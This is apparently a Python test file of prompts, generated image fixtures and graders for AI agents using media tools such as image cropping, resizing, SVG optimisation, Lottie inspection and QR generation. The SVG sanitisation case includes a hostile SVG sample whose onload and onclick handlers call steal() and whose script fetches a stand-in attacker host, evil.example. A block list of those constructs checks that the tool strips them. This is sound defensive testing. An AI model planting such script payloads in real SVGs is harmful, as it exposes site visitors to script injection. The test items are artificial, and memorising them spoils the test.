"""media group: svg-optimize, image-crop, image-compare, lottie-inspector, image-resize, qr, color."""
import colorsys
import io
import json
import re

from tests.coverage.core import Case, Ctx, first_error, has, matches, used
from tests.coverage.fixtures import b64, make_png

GROUP = "media"
SKIPS: dict[tuple[str, str | None], str] = {}


def _img(size, fn, mode="RGBA", fmt="PNG", **save):
    from PIL import Image

    im = Image.new(mode, size, (0, 0, 0, 0) if mode == "RGBA" else (0, 0, 0))
    px = im.load()
    for y in range(size[1]):
        for x in range(size[0]):
            px[x, y] = fn(x, y)
    buf = io.BytesIO()
    im.save(buf, fmt, **save)
    return buf.getvalue()


def _pal_png(size, fn):
    """Palette PNG (1-4 colours, optimised): a few hundred bytes instead of ~1-3 KB, so the model has far less base64 to copy by hand."""
    from PIL import Image

    im = Image.new("P", size)
    px, cols, pal = im.load(), {}, []
    for y in range(size[1]):
        for x in range(size[0]):
            c = fn(x, y)
            if c not in cols:
                cols[c] = len(cols)
                pal += list(c)
            px[x, y] = cols[c]
    im.putpalette(pal)
    buf = io.BytesIO()
    im.save(buf, "PNG", optimize=True)
    return buf.getvalue()


def _attached(c: Ctx):
    return None if used(c, "upload_file") else "never attached the file"


def _readonly(c: Ctx) -> str:
    """Values of every readonly textarea/input on the page (the tools' computed outputs)."""
    return "\n".join(c.page.evaluate(
        "Array.from(document.querySelectorAll('main textarea[readonly], main input[readonly]')).map(e => e.value)"))


def _word(hay: str, n) -> bool:
    return re.search(rf"(?<![\d.]){re.escape(str(n))}(?![\d])", hay) is not None


_PNG = make_png(160, 120)  # small + solid: long runs of identical base64 are what models mis-copy

# ---- image-crop:trim: 90x70 transparent canvas with one opaque 38x25 block
_TRIM = _img((90, 70), lambda x, y: (10, 150, 40, 255) if 13 <= x < 51 and 9 <= y < 34 else (0, 0, 0, 0))

# ---- image-crop:sheet: five tiny images of different sizes
_SHEET = {f"tile{i}.png": make_png(w, h, col) for i, (w, h, col) in enumerate(
    [(30, 20, (200, 0, 0)), (20, 40, (0, 160, 0)), (24, 24, (0, 0, 200)), (50, 10, (200, 200, 0)), (16, 16, (120, 0, 120))], 1)}

# ---- image-compare:compare: 20x10, 3 left columns differ strongly -> 15 % changed
_CA = _img((20, 10), lambda x, y: (200, 100, 50, 255), mode="RGBA")
_CB = _img((20, 10), lambda x, y: (20, 30, 200, 255) if x < 3 else (200, 100, 50, 255), mode="RGBA")
_CHANGED = 3 * 10 / (20 * 10) * 100  # 15.00

# ---- image-compare:alpha: 16x8 = 128 px -> 24 transparent, 40 partial, 64 opaque
_ALPHA = _img((16, 8), lambda x, y: (255, 0, 0, 0) if y < 2 and x < 12 else ((0, 128, 255, 100) if y in (2, 3) else (10, 20, 30, 255)))


def _alpha_counts():
    from PIL import Image
    im = Image.open(io.BytesIO(_ALPHA)).convert("RGBA")
    a = [p[3] for p in im.getdata()]
    return sum(v == 0 for v in a), sum(0 < v < 255 for v in a), sum(v == 255 for v in a)


_AT, _AP, _AO = _alpha_counts()

# ---- image-resize
_WIDE = _pal_png((640, 360), lambda x, y: (30, 90, 200) if x < 320 else (240, 180, 20))
_RW, _RH = 224, round(360 * 224 / 640)  # 126
_RESP = _pal_png((1000, 500), lambda x, y: (200, 40, 40) if x >= 500 else (40, 40, 200))


def _exif_jpg():
    from PIL import Image
    ex = Image.Exif()
    ex[0x010F] = "ZetaCam Industries"
    ex[0x0131] = "PhotoMangler 9"
    buf = io.BytesIO()
    Image.new("RGB", (16, 12), (120, 80, 200)).save(buf, "JPEG", exif=ex, quality=80)
    return buf.getvalue()


_JPG = _exif_jpg()
_ICON = _pal_png((300, 300), lambda x, y: (30, 120, 200))
_TINY = _img((3, 2), lambda x, y: [(255, 0, 0), (0, 255, 0), (0, 0, 255)][x] , mode="RGB")
_TINY_B64 = b64(_TINY)

# ---- svg
_OPT_SVG = ('<svg xmlns="http://www.w3.org/2000/svg" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" '
            'inkscape:version="1.2.1" viewBox="0 0 24 24">\n  <!-- exported by DrawThing 4 -->\n'
            '  <metadata><creator>Somebody Else</creator></metadata>\n'
            '  <g inkscape:label="Layer 1">\n    <circle id="gear-77" cx="12" cy="12" r="9" fill="#c0ffee"/>\n  </g>\n</svg>\n')
_SAN_SVG = ('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40" onload="steal()">'
            '<script>fetch("http://evil.example/x")</script>'
            '<rect id="keep-me" x="4" y="4" width="32" height="32" fill="#12ab34" onclick="steal()"/></svg>')
_VB_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="150px" height="72.5px"><rect width="150" height="72.5" fill="teal"/></svg>'
_SPR_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20"><path d="M7 3l8 7-8 7" fill="none" stroke="#333" stroke-width="2"/></svg>'

_PATHS = {
    "wave-9": "M0 0 C1 1 2 2 3 3 C4 4 5 5 6 6 c1 1 2 2 3 3 S9 9 9 9",
    "box-2": "M1 1 H9 V9 H1 Z M3 3 h4 v4 h-4 z",
    "dot-4": "M5 5 m1 0 a1 1 0 1 0 -2 0",
    "zig-1": "M0 0 L1 1 L2 0 L3 1 M10 10 l1 1",
    "arc-3": "M2 2 Q3 3 4 2 T6 2 C7 3 8 3 9 2",
}
_PATH_SVG = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 12">' + "".join(f'<path id="{k}" d="{v}"/>' for k, v in _PATHS.items()) + "</svg>"
_P_MOVES = sum(len(re.findall(r"[Mm]", d)) for d in _PATHS.values())
_P_MOST_C = max(_PATHS, key=lambda k: len(re.findall(r"[Cc]", _PATHS[k])))
_P_C_TOTAL = sum(len(re.findall(r"[Cc]", d)) for d in _PATHS.values())

# ---- lottie
_LOTTIE = {"v": "5.9.0", "fr": 24, "ip": 10, "op": 154, "w": 375, "h": 812,
           "layers": [{"ty": 4, "nm": "a"}, {"ty": 4, "nm": "b"}, {"ty": 2, "nm": "c", "refId": "i0"}, {"ty": 0, "nm": "d"}, {"ty": 3, "nm": "e"}],
           "assets": [{"id": "i0", "u": "assets/", "p": "hero_77.png", "e": 0},
                      {"id": "i1", "p": "data:image/png;base64,iVBORw0KGgo=", "e": 1}]}
_L_DUR = (154 - 10) / 24  # 6.0

# ---- color
_HEX = "#3a7bd5"
_RGB = tuple(int(_HEX[i:i + 2], 16) for i in (1, 3, 5))


def _hsl(rgb):
    h, l, s = colorsys.rgb_to_hls(*(v / 255 for v in rgb))
    return h * 360, s * 100, l * 100


def _oklch(rgb):
    lin = [(v / 255 / 12.92) if v / 255 <= 0.04045 else (((v / 255) + 0.055) / 1.055) ** 2.4 for v in rgb]
    r, g, b = lin
    l = (0.4122214708 * r + 0.5363325363 * g + 0.0514459929 * b) ** (1 / 3)
    m = (0.2119034982 * r + 0.6806995451 * g + 0.1073969566 * b) ** (1 / 3)
    s = (0.0883024619 * r + 0.2817188376 * g + 0.6299787005 * b) ** (1 / 3)
    L = 0.2104542553 * l + 0.7936177850 * m - 0.0040720468 * s
    A = 1.9779984951 * l - 2.4285922050 * m + 0.4505937099 * s
    B = 0.0259040371 * l + 0.7827717662 * m - 0.8086757660 * s
    import math
    return L, math.hypot(A, B), (math.degrees(math.atan2(B, A)) % 360)


def _color_oracle(c: Ctx):
    h = c.haystack()
    H, S, Lg = _hsl(_RGB)
    m = re.search(r"hsl\(\s*(\d+(?:\.\d+)?)(?:deg)?[\s,]+(\d+(?:\.\d+)?)%[\s,]+(\d+(?:\.\d+)?)%", h)
    if not m:
        return "no hsl() value found"
    if abs(float(m[1]) - H) > 1.5 or abs(float(m[2]) - S) > 1.5 or abs(float(m[3]) - Lg) > 1.5:
        return f"hsl wrong: {m[0]} expected ~{H:.0f} {S:.0f}% {Lg:.0f}%"
    L, C, Hh = _oklch(_RGB)
    m = re.search(r"oklch\(\s*(\d*\.?\d+)(%?)\s+(\d*\.?\d+)\s+(\d*\.?\d+)", h)
    if not m:
        return "no oklch() value found"
    lv = float(m[1]) / (100 if m[2] else 1)
    if abs(lv - L) > 0.005 or abs(float(m[3]) - C) > 0.005 or min(abs(float(m[4]) - Hh), 360 - abs(float(m[4]) - Hh)) > 2:
        return f"oklch wrong: {m[0]} expected {L:.3f} {C:.3f} {Hh:.0f}"
    return None


# ---- qr
_QR_TEXT = "WIFI:T:WPA;S:Dojo-7;P:kata#9141;;"

CASES = [
    Case("image-crop", "crop",
         "I have a 160 by 120 PNG image called photo.png (base64 below). Crop it to a 48 by 36 pixel region and tell me the output size you got.\n\n" + b64(_PNG),
         lambda c: first_error(matches(c.haystack(), r"48\s*[x×]\s*36"), None if used(c, "upload_file") else "never attached the file")),

    Case("image-crop", "trim",
         "The PNG logo.png (base64 below) has a big transparent border around the artwork. Trim away all the fully transparent margin so only the visible artwork is left, "
         "and tell me the width and height before and after trimming.\n\n" + b64(_TRIM),
         lambda c: first_error(_attached(c), matches(c.haystack(), r"90\s*[x×]\s*70"), matches(c.haystack(), r"38\s*[x×]\s*25"),
                               None if re.search(r"38\s*[x×]\s*25", c.answer) else "answer lacks the trimmed size 38x25"),
         note="expected: 90x70 -> 38x25"),

    Case("image-crop", "sheet",
         "Make one contact sheet (a grid of thumbnails with the file names under them) out of these five small PNG pictures, and tell me how many thumbnails ended up in it.\n\n"
         + "\n\n".join(f"{n}:\n{b64(d)}" for n, d in _SHEET.items()),
         lambda c: first_error(_attached(c), matches(c.page_only(), r"Built 5 thumbnails"), None if re.search(r"\b(five|5)\b", c.answer, re.I) else "answer lacks 5"),
         note="page status 'Built 5 thumbnails.'", timeout_ms=300000),

    Case("image-compare", "compare",
         "I have two screenshots of the same 20x10 area, before.png and after.png (base64 below). What percentage of pixels changed noticeably "
         "(treat a per-pixel average channel difference of up to 12 out of 255 as unchanged)? Give me the percentage with two decimals.\n\nbefore.png:\n"
         + b64(_CA) + "\n\nafter.png:\n" + b64(_CB),
         lambda c: first_error(_attached(c), matches(c.haystack(), r"(?<![\d.])15(\.0+)?\s*%"), None if re.search(r"(?<![\d.])15(\.0+)?\s*%", c.answer) else "answer lacks 15%"),
         note="3 of 20 columns differ -> 15.00%"),

    Case("image-compare", "alpha",
         "How much of this PNG (sprite.png, base64 below) is fully transparent, partially transparent (semi-see-through) and fully opaque? Give me the pixel counts for each of the three.\n\n" + b64(_ALPHA),
         lambda c: first_error(_attached(c), *[None if _word(c.answer, n) else f"answer lacks {n}" for n in (_AT, _AP, _AO)]),
         note=f"expected transparent/partial/opaque = {_AT}/{_AP}/{_AO}"),

    Case("lottie-inspector", None,
         "Here is a Lottie animation JSON. How long does it play in seconds, how many layers does it have, and which external (not embedded) image files does it reference? "
         "Leave the inspection of it open on screen so I can look at it too.\n\n" + json.dumps(_LOTTIE),
         lambda c: first_error(matches(c.page_only(), r"\b6(?:\.0+)?\s*s\b"), matches(c.answer, r"\b6(\.0+)?\s*(s|sec)"), has(c.answer, "hero_77.png"),
                               None if _word(c.answer, 5) else "answer lacks 5 layers"),
         note="(154-10)/24 = 6 s, 5 layers, assets/hero_77.png"),

    Case("image-resize", "resize",
         f"Resize this image (banner.png, base64 below) to exactly {_RW} pixels wide while keeping its proportions. What are the new width and height?\n\n" + b64(_WIDE),
         lambda c: first_error(_attached(c), matches(c.haystack(), rf"{_RW}\s*[x×]\s*{_RH}"), matches(c.answer, rf"{_RW}\s*[x×]\s*{_RH}")),
         note="640x360 -> 224x126"),

    Case("image-resize", "scrub",
         "This JPEG (holiday.jpg, base64 below) contains camera metadata I don't want to share. Strip all the metadata and give me a clean JPEG copy. Tell me what the app said when it was done.\n\n" + b64(_JPG),
         lambda c: first_error(_attached(c), matches(c.page_only(), r"Saved JPG without embedded source metadata")),
         note="status 'Saved JPG without embedded source metadata.'"),

    Case("image-resize", "responsive",
         "I have a 1000 pixel wide picture hero.png (base64 below). Make web-sized copies at widths 250, 480, 800 and 1400 for a responsive srcset, and tell me which widths you actually got.\n\n" + b64(_RESP),
         lambda c: first_error(_attached(c), *[matches(c.page_only(), rf"\b{w}w\b") for w in (250, 480, 800)],
                               "1400w produced (upscaled)" if re.search(r"\b1400w\b", c.page_only()) else None,
                               None if all(_word(c.answer, w) for w in (250, 480, 800)) else "answer lacks the widths"),
         note="1400 > source width must be skipped"),

    Case("image-resize", "favicon",
         "Create the usual set of app-icon / favicon PNGs from this square logo (logo.png, base64 below) and list the pixel sizes you produced.\n\n" + b64(_ICON),
         lambda c: first_error(_attached(c), *[matches(c.page_only(), rf"\b{s}\s*[x×]\s*{s}\b") for s in (16, 32, 48, 180, 512)],
                               None if all(_word(c.answer, s) for s in (16, 32, 48, 180, 512)) else "answer lacks sizes"),
         note="16/32/48/180/512"),

    Case("image-resize", "data-uri",
         "Embed this tiny image (dot.png, base64 below) inline in an HTML <img> tag, without a separate file, and show me the final tag.\n\n" + _TINY_B64,
         lambda c: first_error(_attached(c), None if _TINY_B64 in c.page_only() else "page lacks the real base64", None if "<img" in c.page_only() else "no <img> output on the page",
                               None if _TINY_B64 in c.answer else "answer lacks the real base64")),

    Case("svg-optimize", "optimize",
         "Minify this SVG for production: drop the comments, the metadata block, editor-specific attributes and extra whitespace but keep it rendering the same, and show me the result.\n\n" + _OPT_SVG,
         lambda c: (lambda o: first_error(
             None if o.strip().startswith("<svg") else "no optimized svg on the page",
             "comment kept" if "<!--" in o else None, "metadata kept" if "metadata" in o else None, "inkscape attrs kept" if "inkscape:" in o else None,
             has(o, "gear-77", "c0ffee"), "not shorter than the input" if len(o) >= len(_OPT_SVG) else None))(_readonly(c))),

    Case("svg-optimize", "sanitize",
         "I got this SVG from an untrusted user. Make it safe to embed in my site (no scripts or event handlers) while keeping the visible shape, and show me the safe markup.\n\n" + _SAN_SVG,
         lambda c: (lambda o: first_error(
             None if "<rect" in o else "no sanitized svg with the rect on the page",
             *["dangerous construct kept: " + b for b in ("<script", "onload", "onclick", "evil.example") if b in o][:1],
             has(o, "keep-me", "12ab34")))(_readonly(c))),

    Case("svg-optimize", "viewbox",
         "This SVG has width and height but no viewBox, so it doesn't scale. Add the right viewBox and show me the fixed SVG.\n\n" + _VB_SVG,
         lambda c: first_error(matches(_readonly(c), r'viewBox="0 0 150 72\.5"'), matches(c.answer, r"0 0 150 72\.5"))),

    Case("svg-optimize", "paths",
         "Analyse the path data in this SVG: how many path elements are there, how many sub-paths (move-to commands, upper or lower case) in total, "
         "and which path id has the most cubic Bezier (C/c) commands? Leave the analysis open on screen so I can look at it too.\n\n" + _PATH_SVG,
         lambda c: first_error(None if _word(c.answer, len(_PATHS)) else f"answer lacks {len(_PATHS)} paths", None if _word(c.answer, _P_MOVES) else f"answer lacks {_P_MOVES} subpaths",
                               has(c.answer, _P_MOST_C), has(c.page_only(), "Path elements", ci=True))),

    Case("svg-optimize", "sprite",
         "Turn this icon into a symbol for an SVG sprite sheet with the id chevron-right, and show me the sprite markup and how to reference it.\n\n" + _SPR_SVG,
         lambda c: first_error(matches(_readonly(c), r'<symbol id="chevron-right" viewBox="0 0 20 20">'), matches(_readonly(c), r"icons\.svg#chevron-right"))),

    Case("svg-optimize", "png",
         "Render this SVG to a PNG that is exactly 333 pixels wide and 148 pixels tall, and tell me the exported size.\n\n"
         '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 90 40"><rect width="90" height="40" rx="6" fill="#d2691e"/><circle cx="20" cy="20" r="9" fill="white"/></svg>',
         lambda c: first_error(matches(c.page_only(), r"Exported 333\s*[x×]\s*148 PNG"), matches(c.answer, r"333\s*[x×]\s*148"))),

    Case("qr", None,
         f"Make me a QR code for this Wi-Fi login string, with the highest error correction level and 300 pixels size, and tell me how many characters it encodes: {_QR_TEXT}",
         lambda c: first_error(
             None if _QR_TEXT in c.values() else "text field lacks the Wi-Fi string",
             None if "H" in c.values() else "error correction is not H",
             None if "300" in c.values() else "size is not 300",
             None if _word(c.answer, len(_QR_TEXT)) else f"answer lacks {len(_QR_TEXT)} characters"),
         note=f"{len(_QR_TEXT)} chars"),

    Case("color", None,
         f"Convert the colour {_HEX} into its RGB, HSL and OKLCH forms and give me all three.",
         lambda c: first_error(_color_oracle(c), None if all(_word(c.answer, v) for v in _RGB) else "answer lacks rgb 58 123 213"),
         note="#3a7bd5 = rgb(58 123 213)"),
]
